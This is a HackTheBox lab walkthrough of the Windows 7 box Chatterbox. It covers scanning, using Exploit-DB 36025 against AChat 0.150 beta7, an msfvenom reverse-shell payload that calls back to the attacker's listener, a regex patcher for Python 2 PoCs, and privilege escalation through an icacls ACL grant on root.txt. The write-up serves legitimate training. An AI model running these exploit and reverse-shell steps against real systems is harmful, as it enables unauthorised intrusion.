---
tags: [HTB, Chatterbox, Windows, AChat, BufferOverflow, UnicodeMixed, ACL, Easy]
platform: HackTheBox
os: Windows 7 Professional SP1 x86
hostname: CHATTERBOX
domain: WORKGROUP
difficulty: Medium
ip: $BoxIP
status: Complete
---

# HTB: Chatterbox, Full Walkthrough

## The gist

Chatterbox is a standalone Windows 7 host running AChat 0.150 beta7. Exploit-DB 36025 provides a UDP buffer overflow PoC. After generating x86 Unicode-safe shellcode and patching the Python 2 script, the shell lands as Alfred.

Alfred is low privilege, but the Administrator Desktop grants him inherited full control. Updating the ACL on `root.txt` provides the root flag without a separate kernel or service exploit.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows 7 Professional SP1 x86 |
| Hostname | CHATTERBOX |
| Domain | WORKGROUP |
| Difficulty | Medium |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName Chatterbox
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Chatterbox
boxset Username alfred
boxset AdminUser Administrator
boxset ExploitPort 9256
boxset ListenPort 4444
```

## 1. Workspace setup

The helper creates the standard workspace and log before scanning. `htblog` captures the terminal output for the later walkthrough.

```bash
boxstart $BoxName $BoxIP htb
htblog
```

## 2. Full TCP scan

I scanned every TCP port first because AChat uses unusual high ports. `-p-` checks all ports, `--min-rate 5000` speeds up the sweep, and `-oN` saves readable output.

```bash
sudo nmap -p- --min-rate 5000 -oN $BoxDir/scans/allports.txt $BoxIP
```

Ports 135, 139, 445, 9255, 9256, and 49152 through 49157 were open. The high AChat ports were the main lead.

![[chatterbox-2-allports.png]]

SCREENSHOT: Capture the complete scan with the AChat ports visible.

## 3. Service and version scan

`-sC` runs standard discovery scripts and `-sV` identifies service versions. I limited this scan to the discovered ports because version probing across all ports would be slower.

```bash
sudo nmap -p 135,139,445,9255,9256 -sC -sV -oN $BoxDir/scans/services.txt $BoxIP
```

Port 9255 showed AChat, and port 9256 showed AChat 0.150 beta7. The host was Windows 7 Professional SP1 x86 in WORKGROUP. The x86 detail matters because the shellcode must match it.

Reference: [Exploit-DB 36025](https://www.exploit-db.com/exploits/36025)

![[chatterbox-3-services.png]]

SCREENSHOT: Capture the AChat version and Windows x86 details.

## 4. Search for a public exploit

The exact product and version can now be matched to a manual proof of concept. `searchsploit` searches the local Exploit-DB index without launching an automated exploit framework.

```bash
searchsploit achat
```

The result was EDB-36025, AChat 0.150 beta7 Remote Buffer Overflow, associated with CVE-2015-1578 and CVE-2015-1577.

## 5. Review the PoC

The PoC uses a UDP socket to `$ExploitPort`, includes placeholder shellcode, contains a hardcoded target address, and is written for Python 2. It sends one large packet and exits.

```bash
searchsploit -x 36025
```

![[chatterbox-exploit-source.png]]

SCREENSHOT: Highlight the `buf` block and hardcoded address in EDB-36025.

## 6. Copy the PoC

```bash
searchsploit -m 36025
```

The script was saved as `$BoxDir/36025.py`.

## 7. Generate shellcode

AChat's input handling requires printable Unicode-safe bytes. `x86/unicode_mixed` encodes the reverse shell for that constraint. `BufferRegister=EAX` tells the decoder where the encoded payload begins. Without it, the decoder can use the wrong address and fail silently. `LHOST` is our VPN address and `LPORT` is the callback port. Note: `msfvenom` is a standalone payload generator -- it is not msfconsole or a Metasploit module, so using it here is fine on OSCP.

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$ListenPort \
  -e x86/unicode_mixed BufferRegister=EAX -f python
```

The encoder succeeded with a 774-byte payload.

Reference: [PayloadsAllTheThings -- msfvenom cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#msfvenom)

> [!warning] 💡 Hint
> **Watch out:** `BufferRegister=EAX` is required for this PoC. Omitting it can produce a payload that reaches the target but does not execute.

![[msfvenom-shellcode.png]]

SCREENSHOT: Red box the `buf = b` block and 774-byte payload size.

## 8. Patch the exploit

Two things need changing in 36025.py before it will work: the `buf` variable (currently a calculator shellcode) needs replacing with our reverse shell payload, and the hardcoded target IP `192.168.91.130` needs changing to `$BoxIP`.

Rather than editing by hand (the buf block is 66 lines), we wrote a small Python patcher and ran it once:

```bash
python3 $BoxDir/patch_36025.py
```

> [!abstract] 🛠️ The patcher -- what it did and why
>
> The script opened `36025.py`, made two changes, verified them, and wrote the file back.
>
> **Change 1 -- replace the buf block**
>
> The original script uses Python 2 string format: `buf =  ""` followed by many `buf += "\x..."` lines (no parentheses, no `b` prefix). The patcher used a regex to match that exact pattern and swap in the msfvenom output.
>
> One non-obvious problem: `re.sub` treats `\x` in the *replacement* string as a regex backreference, which throws a `PatternError`. The fix is to pass the replacement as a **lambda** instead of a plain string -- a lambda return value is never scanned for backreferences.
>
> ```python
> patched = re.sub(
>     r'buf =  ""(?:\nbuf \+= "[^"]*")+',
>     lambda m: NEW_BUF,
>     code
> )
> ```
>
> The `b""` prefix in our msfvenom output is safe to leave in: in Python 2, `b""` and `""` are identical. The script runs fine with either.
>
> **Change 2 -- fix the hardcoded IP**
>
> A simple string replace: `code.replace('192.168.91.130', '$BoxIP')`. No regex needed.
>
> **Verification**
>
> The patcher re-opened the file after writing and confirmed:
> - `$BoxIP` appears in the `server_address` line
> - `\x50\x50\x59\x41` (first bytes of our shellcode) appears in the buf block
>
> Both lines printed `[+]` before we ran the exploit.
>
> **Generalized version**
>
> The box-specific patcher above was extracted into a reusable tool at `OSCP/TOOLS/buf_swap.py`. It accepts any Python 2 EDB PoC and takes the target IP as an argument. The same regex and lambda trick applies to every buf-style exploit, not just AChat. Workflow for future boxes:
>
> ```bash
> msfvenom ... -f python | python3 ~/Documents/Obsidian/main-vault/OSCP/TOOLS/buf_swap.py exploit.py $BoxIP
> ```

```bash
python2 -m py_compile $BoxDir/36025.py
```

The syntax check passed. The patcher confirmed the buffer, target address, and Unicode mixed EAX payload.

![[exploit-patched.png]]

SCREENSHOT: Red box both successful patch verification lines.

## 9. Catch the shell

The exploit is sent to UDP `$ExploitPort`; the shellcode connects back over TCP to `$LocalIP:$ListenPort`. Start the listener first.

```bash
nc -lvnp $ListenPort
```

In another terminal:

```bash
cd $BoxDir && python2 36025.py
```

The script printed `---->{P00F}!` and the listener received a Windows command shell from `$BoxIP`. Blank prompt lines were normal buffering artefacts.

![[initial-shell.png]]

SCREENSHOT: Red box the callback and Windows command prompt.

## 10. Enumerate the foothold

I checked identity, token privileges, and group membership before choosing a privilege path. `whoami /priv` shows enabled Windows token privileges, while `net user` displays local account information.

```cmd
whoami
whoami /priv
net user $Username
```

The shell was `chatterbox\\alfred`. Alfred had no useful impersonation or debugging privileges and belonged only to Users, so I moved to filesystem ACL checks.

![[foothold-enum.png]]

SCREENSHOT: Red box `chatterbox\\alfred` and `*Users`.

## 11. User flag

The user flag was on Alfred's desktop. I confirmed its path and stored its value privately without displaying it.

```cmd
type C:\Users\$Username\Desktop\user.txt
```

The flag was confirmed at `C:\Users\$Username\Desktop\user.txt`.

## 12. AlwaysInstallElevated check

AlwaysInstallElevated can make MSI installations run as SYSTEM, but both the HKCU and HKLM values must be enabled. I checked both registry locations.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both values were absent, so this path was unavailable.

## 13. Stored credential check

`cmdkey` lists saved Windows credentials that might provide another account.

```cmd
cmdkey /list
```

No stored credentials were present.

## 14. Scheduled task check

For scheduled tasks, `Run As User` matters more than the script path. A writable script is not useful if it runs as the same low-privileged user.

```cmd
schtasks /query /fo LIST /v /tn "\Reset"
```

The task ran as Alfred and executed `C:\Users\Alfred\AppData\Local\Microsoft\Windows Media\reset.bat` every minute. It restarted AChat as a box maintenance task, but gave no escalation path.

## 15. Administrator Desktop ACLs

`icacls` displays Windows permissions. I checked both the protected file and its parent folder because inherited folder permissions can control files inside it.

```cmd
icacls "C:\Users\$AdminUser\Desktop\root.txt"
icacls "C:\Users\$AdminUser\Desktop"
```

The file allowed Administrator full control, while the Desktop granted Alfred inherited full control. `(I)` means inherited, `(OI)` means object inherit, `(CI)` means container inherit, and `(F)` means full control. This gave Alfred control over the file ACL.

Reference: [HackTricks -- Windows ACL abuse](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/acls-dacls-sacls-aces)

> [!tip] ⚡ More efficient path
> **What we did:** Checked several common privilege paths before inspecting the parent directory.
>
> **Faster approach:**
> ```cmd
> icacls "C:\Users\$AdminUser\Desktop\root.txt"
> icacls "C:\Users\$AdminUser\Desktop"
> ```
> **Why:** The parent ACL immediately shows whether inherited permissions provide a direct route to the protected file.

![[acl-privesc.png]]

SCREENSHOT: Red box Alfred's inherited full-control entry.

## 16. Grant access and confirm root flag

Because Alfred could modify the ACL, `/grant` added full control for Alfred. I then read the file and stored the result privately.

```cmd
icacls "C:\Users\$AdminUser\Desktop\root.txt" /grant $Username:F
type "C:\Users\$AdminUser\Desktop\root.txt"
```

The root flag was confirmed at `C:\Users\$AdminUser\Desktop\root.txt`. Its value is intentionally omitted.

## 17. Restore the ACL and clean down

`/remove` deletes only the temporary Alfred entry. I did not use `/reset`, because that could remove legitimate explicit permissions.

```cmd
icacls "C:\Users\$AdminUser\Desktop\root.txt" /remove $Username
icacls "C:\Users\$AdminUser\Desktop\root.txt"
exit
```

The verification showed only the original Administrator access remained. No accounts, services, persistence, or uploaded files were left behind.

> [!warning] 💡 Hint
> **Watch out:** Revert ACL changes before leaving. Use `/remove` for the entry you added, not `/reset` for the entire DACL.

## Credentials

| Account | Source | Use |
|---|---|---|
| `alfred` | AChat buffer overflow | Initial shell and ACL abuse |
| `Administrator` | Existing protected desktop ACL | Original owner of root.txt |

Passwords and flag values are intentionally omitted.

## Key lessons

- AChat 0.150 beta7 is an unauthenticated UDP buffer overflow, so the high port must not be missed during recon.
- `BufferRegister=EAX` is required when generating the Unicode-safe shellcode for this PoC.
- Python 2 PoCs can still work when their packet logic is preserved and the payload is replaced carefully.
- Always check the parent directory ACL, not only the protected file.
- `(I)`, `(OI)`, and `(CI)` explain how permissions flow from a folder to its contents.
- `icacls /grant` can provide a direct read path, while `/remove` cleanly reverts the temporary change.
- Older Windows boxes may expose a filesystem route before a kernel route.
- Watch the ippsec walkthrough: [Chatterbox](https://ippsec.rocks/?#Chatterbox)

## Checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] AChat version identified
- [x] Public PoC reviewed
- [x] Unicode-safe shellcode generated
- [x] Exploit patched
- [x] Alfred shell received
- [x] User flag path confirmed privately
- [x] AlwaysInstallElevated checked
- [x] Stored credentials checked
- [x] Scheduled task checked
- [x] ACLs enumerated
- [x] Root flag path confirmed privately
- [x] ACL restored and cleanup verified

